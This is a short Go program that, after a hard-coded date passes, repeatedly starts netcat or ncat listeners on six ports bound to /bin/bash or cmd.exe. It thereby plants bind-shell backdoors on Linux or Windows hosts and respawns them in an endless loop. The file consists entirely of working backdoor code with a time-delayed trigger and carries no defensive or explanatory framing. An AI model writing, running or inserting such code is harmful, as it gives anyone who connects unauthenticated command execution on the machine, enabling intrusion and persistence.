//Author: Shail Patel
package main

// import
import (
	"fmt"
	"os/exec"
	"runtime"
	"strconv"
	"time"
)

func ncatSpawnListeners() {
	osType := runtime.GOOS
  //To open up the following ports
	portNos:= []int{7864, 7777, 7783, 8348, 8677, 8999}
	for {
	timeNow:= time.Now().Unix()
  //Unix Epoch Timestamp using epochconverter
	if timeNow > 1570583580{
	for _, port := range portNos{
		if osType == "linux" {
    //Open up a netcat listner, pop up a shell
			cmd := exec.Command("nc", "-l", "-k", "-p", strconv.Itoa(port), "-e", "/bin/bash")
			err := cmd.Start()
			if err != nil {
				fmt.Printf("[ERROR]: %s", err)
			}
		} else {
			cmd := exec.Command("ncat.exe", "-l", "-k", "-p", strconv.Itoa(port), "-e", "cmd.exe")
			err := cmd.Start()
			if err != nil {
				fmt.Printf("[ERROR]: %s", err)
			}
		}
    //Start regenerating these ports after 30 seconds passes
		time.Sleep(30* time.Second)
	}
	time.Sleep(100 * time.Hour)
	}
	}
}

func main() {
	ncatSpawnListeners()
}
